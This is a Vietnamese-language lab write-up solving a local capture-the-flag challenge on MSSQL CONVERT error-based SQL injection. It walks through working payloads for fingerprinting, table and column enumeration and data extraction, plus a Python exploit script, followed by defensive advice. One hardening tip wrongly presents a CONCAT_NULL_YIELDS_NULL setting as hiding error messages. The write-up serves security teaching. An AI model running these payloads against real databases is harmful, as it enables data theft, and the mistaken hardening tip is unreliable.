# SQLi-012 Solution: MSSQL CONVERT Error-based Injection

## 📋 Thông Tin Challenge

- **URL:** `http://localhost:5012/search?q=john`
- **Tham số vulnerable:** `q`
- **Kỹ thuật:** MSSQL CONVERT Error-based Injection
- **Target:** Bảng `secrets`, cột `value`
- **DBMS:** Microsoft SQL Server

---

## 🔍 BƯỚC 1: Detection - Phát Hiện Lỗi

### 1.1. Test Basic Injection

```
http://localhost:5012/search?q=john'
```

**Kết quả:**

```
Unclosed quotation mark after the character string ''.
```

✅ **Kết luận:** Có SQL Injection!

### 1.2. Test Comment Syntax

```
http://localhost:5012/search?q=john'--
http://localhost:5012/search?q=john'#
http://localhost:5012/search?q=john'/*
```

**Kết quả:**

- `--` → Hoạt động bình thường (MSSQL syntax)
- `#` → Vẫn báo lỗi (không phải MySQL)
- `/*` → Hoạt động (SQL comment)

✅ **Kết luận:** Khả năng cao là MSSQL!

### 1.3. Test CONVERT Error-based

```
http://localhost:5012/search?q=a' AND 1=CONVERT(int,@@version)--
```

**URL Encoded:**

```
GET /?q=a'+AND+1%3dCONVERT(int,@@version)-- HTTP/1.1
```

**Kết quả:**

```
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5' to data type int.
```

✅ **HOẠT ĐỘNG HOÀN HẢO!** Đây chính là MSSQL Server 2019!

---

## 🎯 BƯỚC 2: Hiểu Cơ Chế CONVERT Error-based

### 2.1. CONVERT Function Syntax

```sql
CONVERT(target_type, expression)
```

**Ví dụ:**

```sql
CONVERT(int, '123')     → 123 (thành công)
CONVERT(int, 'abc')     → ERROR: Conversion failed
```

### 2.2. Tại Sao CONVERT Tạo Error?

Khi convert **string chứa text** sang **integer**, MSSQL không thể chuyển đổi và **throw error với nội dung string gốc**.

**Cơ chế hoạt động:**

```sql
' AND 1=CONVERT(int, @@version)--
```

1. MSSQL thực thi: `SELECT ... WHERE ... AND 1=CONVERT(int, @@version)`
2. `@@version` trả về string: `'Microsoft SQL Server 2019...'`
3. CONVERT cố chuyển string → int → **THẤT BẠI**
4. Error message: `Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.`

✅ **String data được leak trong error message!**

### 2.3. So Sánh Với MySQL

| DBMS      | Error-based Function | Syntax                              |
| --------- | -------------------- | ----------------------------------- |
| **MySQL** | ExtractValue         | `ExtractValue(1,CONCAT(0x7e,data))` |
| **MySQL** | UpdateXML            | `UpdateXML(1,CONCAT(0x7e,data),1)`  |
| **MSSQL** | CONVERT              | `CONVERT(int,data)`                 |
| **MSSQL** | CAST                 | `CAST(data AS int)`                 |

**Ưu điểm CONVERT:**

- Syntax đơn giản hơn
- Không giới hạn 32 ký tự như MySQL XPATH functions
- Native function của MSSQL

---

## 🧠 BƯỚC 3: Fingerprint Database

### 3.1. Xác Định Database Name

```
GET /?q=a'+AND+1%3dCONVERT(int,DB_NAME())-- HTTP/1.1
```

**Decoded:**

```sql
a' AND 1=CONVERT(int,DB_NAME())--
```

**Kết quả:**

```
Conversion failed when converting the nvarchar value 'company_db' to data type int.
```

✅ **Database name:** `company_db`

### 3.2. Test Các MSSQL Functions

```sql
-- Current user
' AND 1=CONVERT(int,USER_NAME())--
→ Conversion failed when converting the nvarchar value 'sa' to data type int.

-- Database version
' AND 1=CONVERT(int,@@version)--
→ Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.

-- Server name
' AND 1=CONVERT(int,@@servername)--
→ Conversion failed when converting the nvarchar value 'DESKTOP-XXX' to data type int.
```

---

## 🔎 BƯỚC 4: Enumerate Tables

### 4.1. List All Tables

**Payload:**

```
GET /?q=a'+AND+1%3dCONVERT(int,(SELECT+(SELECT+table_name%2b','+FROM+information_schema.tables+FOR+XML+PATH(''))))-- HTTP/1.1
```

**Decoded:**

```sql
a' AND 1=CONVERT(int,(SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))))--
```

**Breakdown:**

1. **FOR XML PATH('')**: Ghép tất cả rows thành 1 string
2. **table_name+','**: Nối mỗi table với dấu phẩy
3. **Nested SELECT**: Đảm bảo kết quả là 1 string duy nhất
4. **CONVERT(int, ...)**: Trigger error để leak data

**Kết quả:**

```
Conversion failed when converting the nvarchar value 'employees,secrets,' to data type int.
```

✅ **Tables found:**

- `employees`
- `secrets`

### 4.2. Giải Thích FOR XML PATH

**FOR XML PATH** là technique để concatenate multiple rows:

```sql
-- Without FOR XML PATH
SELECT table_name FROM information_schema.tables
→ Multiple rows:
  employees
  secrets

-- With FOR XML PATH
SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')
→ Single string: 'employees,secrets,'
```

**Tại sao cần nested SELECT?**

```sql
-- Không work (multiple rows)
CONVERT(int, (SELECT table_name FROM information_schema.tables))

-- Work (single string)
CONVERT(int, (SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))))
```

---

## 🔐 BƯỚC 5: Enumerate Columns từ Table `secrets`

### 5.1. List Columns

**Payload:**

```
GET /?q=a'+AND+1%3dCONVERT(int,(SELECT+(SELECT+column_name%2b','+FROM+information_schema.columns+WHERE+table_name='secrets'+FOR+XML+PATH(''))))-- HTTP/1.1
```

**Decoded:**

```sql
a' AND 1=CONVERT(int,(SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='secrets' FOR XML PATH(''))))--
```

**Kết quả:**

```
Conversion failed when converting the nvarchar value 'id,value,' to data type int.
```

✅ **Columns in `secrets` table:**

- `id`
- `value`

### 5.2. Alternative: Get Column Count

```sql
-- Method 1: Count columns
' AND 1=CONVERT(int,(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='secrets'))--
→ Conversion failed when converting the nvarchar value '2' to data type int.

-- Method 2: Direct column names
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='secrets'))--
→ Conversion failed when converting the nvarchar value 'id' to data type int.
```

---

## 🚀 BƯỚC 6: Extract Flag

### 6.1. Get All Values from `secrets` Table

**Final Payload:**

```
GET /?q=a'+AND+1%3dCONVERT(int,(SELECT+(SELECT+value%2b','+FROM+secrets+FOR+XML+PATH(''))))-- HTTP/1.1
```

**Decoded:**

```sql
a' AND 1=CONVERT(int,(SELECT (SELECT value+',' FROM secrets FOR XML PATH(''))))--
```

**Kết quả:**

```
Conversion failed when converting the nvarchar value 'FLAG{mssql_c0nv3rt_c4st_3rr0r},' to data type int.
```

✅ **FLAG:** `FLAG{mssql_c0nv3rt_c4st_3rr0r}`

### 6.2. Alternative: Get Single Row

Nếu có nhiều rows, có thể dùng TOP:

```sql
-- Get first row
' AND 1=CONVERT(int,(SELECT TOP 1 value FROM secrets))--
→ Conversion failed when converting the nvarchar value 'FLAG{mssql_c0nv3rt_c4st_3rr0r}' to data type int.

-- Get second row (nếu có)
' AND 1=CONVERT(int,(SELECT TOP 1 value FROM secrets WHERE value NOT IN (SELECT TOP 1 value FROM secrets)))--
```

---

## 🔧 BƯỚC 7: Automation Script

### 7.1. Python Script

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote

BASE_URL = "http://localhost:5012/search"

def extract_error(payload):
    """Extract data from CONVERT error message"""
    r = requests.get(BASE_URL, params={"q": payload})
    match = re.search(r"converting the nvarchar value '([^']+)'", r.text)
    return match.group(1) if match else None

print("[*] Step 1: Detect MSSQL version")
payload1 = "a' AND 1=CONVERT(int,@@version)--"
version = extract_error(payload1)
print(f"[+] Version: {version}\n")

print("[*] Step 2: Get database name")
payload2 = "a' AND 1=CONVERT(int,DB_NAME())--"
db_name = extract_error(payload2)
print(f"[+] Database: {db_name}\n")

print("[*] Step 3: Enumerate tables")
payload3 = "a' AND 1=CONVERT(int,(SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))))--"
tables = extract_error(payload3)
print(f"[+] Tables: {tables}\n")

print("[*] Step 4: Get columns from 'secrets' table")
payload4 = "a' AND 1=CONVERT(int,(SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='secrets' FOR XML PATH(''))))--"
columns = extract_error(payload4)
print(f"[+] Columns in 'secrets': {columns}\n")

print("[*] Step 5: Extract flag")
payload5 = "a' AND 1=CONVERT(int,(SELECT (SELECT value+',' FROM secrets FOR XML PATH(''))))--"
flag = extract_error(payload5)
print(f"[+] Flag: {flag.rstrip(',')}")
```

### 7.2. Chạy Script

```bash
python3 exploit.py
```

**Output:**

```
[*] Step 1: Detect MSSQL version
[+] Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5

[*] Step 2: Get database name
[+] Database: company_db

[*] Step 3: Enumerate tables
[+] Tables: employees,secrets,

[*] Step 4: Get columns from 'secrets' table
[+] Columns in 'secrets': id,value,

[*] Step 5: Extract flag
[+] Flag: FLAG{mssql_c0nv3rt_c4st_3rr0r}
```

---

## 📊 BƯỚC 8: Tổng Kết

### 8.1. Complete Exploitation Chain

```
1. Detection:
   ' AND 1=CONVERT(int,@@version)--

2. Fingerprinting:
   ' AND 1=CONVERT(int,DB_NAME())--

3. Table Enumeration:
   ' AND 1=CONVERT(int,(SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))))--

4. Column Enumeration:
   ' AND 1=CONVERT(int,(SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='secrets' FOR XML PATH(''))))--

5. Data Extraction:
   ' AND 1=CONVERT(int,(SELECT (SELECT value+',' FROM secrets FOR XML PATH(''))))--
```

### 8.2. Key Techniques

1. **CONVERT Error-based**: Chuyển string sang int để trigger error
2. **FOR XML PATH**: Concatenate multiple rows thành single string
3. **Nested SELECT**: Đảm bảo subquery trả về scalar value
4. **information_schema**: Enumerate database structure

### 8.3. So Sánh CONVERT vs CAST

```sql
-- CONVERT syntax
CONVERT(target_type, expression)
' AND 1=CONVERT(int,@@version)--

-- CAST syntax
CAST(expression AS target_type)
' AND 1=CAST(@@version AS int)--
```

**Cả 2 đều hoạt động giống nhau**, nhưng CONVERT có syntax ngắn gọn hơn.

### 8.4. Challenge Comparison

| Challenge    | DBMS      | Technique              | Key Feature                       |
| ------------ | --------- | ---------------------- | --------------------------------- |
| SQLi-009     | MySQL     | ExtractValue           | XPATH error, 32 char limit        |
| SQLi-010     | MySQL     | UpdateXML              | XPATH error, 32 char limit        |
| SQLi-011     | MySQL     | ExtractValue+SUBSTRING | Multi-part extraction             |
| **SQLi-012** | **MSSQL** | **CONVERT**            | **No length limit, FOR XML PATH** |

---

## 🎓 BƯỚC 9: Kiến Thức Mở Rộng

### 9.1. MSSQL System Functions

```sql
-- Version
@@VERSION
SERVERPROPERTY('ProductVersion')

-- Database
DB_NAME()
DATABASE_NAME()

-- User
USER_NAME()
SYSTEM_USER
SUSER_NAME()

-- Server
@@SERVERNAME
HOST_NAME()
```

### 9.2. FOR XML PATH Alternatives

```sql
-- Method 1: FOR XML PATH
SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')
→ 'employees,secrets,'

-- Method 2: STRING_AGG (SQL Server 2017+)
SELECT STRING_AGG(table_name, ',') FROM information_schema.tables
→ 'employees,secrets'

-- Method 3: STUFF + FOR XML
SELECT STUFF((SELECT ','+table_name FROM information_schema.tables FOR XML PATH('')),1,1,'')
→ 'employees,secrets'
```

### 9.3. Advanced Enumeration

**Get all columns from all tables:**

```sql
' AND 1=CONVERT(int,(
    SELECT (
        SELECT table_name+'.'+column_name+','
        FROM information_schema.columns
        FOR XML PATH('')
    )
))--
```

**Get data with column names:**

```sql
' AND 1=CONVERT(int,(
    SELECT (
        SELECT 'id='+CAST(id AS VARCHAR)+',value='+value+';'
        FROM secrets
        FOR XML PATH('')
    )
))--
```

### 9.4. Type Conversion Targets

Ngoài `int`, có thể dùng các types khác:

```sql
-- Convert to int (common)
CONVERT(int, data)

-- Convert to bigint
CONVERT(bigint, data)

-- Convert to smallint
CONVERT(smallint, data)

-- Convert to datetime (nếu data không phải date)
CONVERT(datetime, data)
```

**Best practice:** Dùng `int` vì universal và error message rõ ràng.

---

## 🛡️ BƯỚC 10: Defense & Mitigation

### 10.1. Vulnerable Code Pattern

```python
# VULNERABLE
query = f"SELECT * FROM employees WHERE name LIKE '%{search_term}%'"
```

❌ **Vấn đề:**

- String concatenation
- Không parameterized query
- Error messages exposed

### 10.2. Secure Code - Parameterized Queries

```python
# SECURE - Method 1: Parameterized query
cursor.execute(
    "SELECT * FROM employees WHERE name LIKE ?",
    (f"%{search_term}%",)
)

# SECURE - Method 2: Stored procedure
cursor.execute("{CALL search_employees(?)}", (search_term,))
```

### 10.3. Error Handling

```python
# VULNERABLE - Expose error details
try:
    cursor.execute(query)
except Exception as e:
    return str(e), 500  # ❌ Exposes SQL error

# SECURE - Generic error message
try:
    cursor.execute(query)
except Exception as e:
    logger.error(f"Database error: {e}")  # Log internally
    return "An error occurred", 500  # ✅ Generic message
```

### 10.4. Additional Protections

1. **Least Privilege:**

   ```sql
   -- User chỉ có SELECT permission
   CREATE USER webapp_user WITH PASSWORD = 'strong_password';
   GRANT SELECT ON employees TO webapp_user;
   -- NO GRANT trên information_schema
   ```

2. **Input Validation:**

   ```python
   import re

   def validate_search(term):
       # Only allow alphanumeric and spaces
       if not re.match(r'^[a-zA-Z0-9\s]+$', term):
           raise ValueError("Invalid characters")
       if len(term) > 50:
           raise ValueError("Search term too long")
       return term
   ```

3. **WAF Rules:**

   ```
   Block: CONVERT, CAST, FOR XML PATH
   Block: information_schema
   Monitor: @@version, DB_NAME(), USER_NAME()
   Block: Multiple SQL keywords in single parameter
   ```

4. **Database Hardening:**

   ```sql
   -- Disable xp_cmdshell
   EXEC sp_configure 'xp_cmdshell', 0;
   RECONFIGURE;

   -- Hide error messages
   ALTER DATABASE company_db SET CONCAT_NULL_YIELDS_NULL OFF;
   ```

---

## 🎯 Next Steps

**Continue Learning:**

- [SQLi-013: MSSQL Time-based Blind](../../SQLi-013/) (coming soon)
- [SQLi-014: MSSQL Stacked Queries](../../SQLi-014/) (coming soon)

**Practice More MSSQL Functions:**

```sql
-- Get current user
' AND 1=CONVERT(int,USER_NAME())--

-- Get server name
' AND 1=CONVERT(int,@@SERVERNAME)--

-- List all databases
' AND 1=CONVERT(int,(SELECT (SELECT name+',' FROM sys.databases FOR XML PATH(''))))--

-- Get table row count
' AND 1=CONVERT(int,(SELECT CAST(COUNT(*) AS VARCHAR) FROM secrets))--
```

---

## 📚 References

- [Microsoft SQL Server CONVERT Documentation](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql)
- [FOR XML PATH Technique](https://docs.microsoft.com/en-us/sql/relational-databases/xml/for-xml-sql-server)
- [OWASP SQL Injection - MSSQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection - MSSQL](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**🏁 Challenge Complete! Flag extracted using MSSQL CONVERT error-based injection with FOR XML PATH technique.**
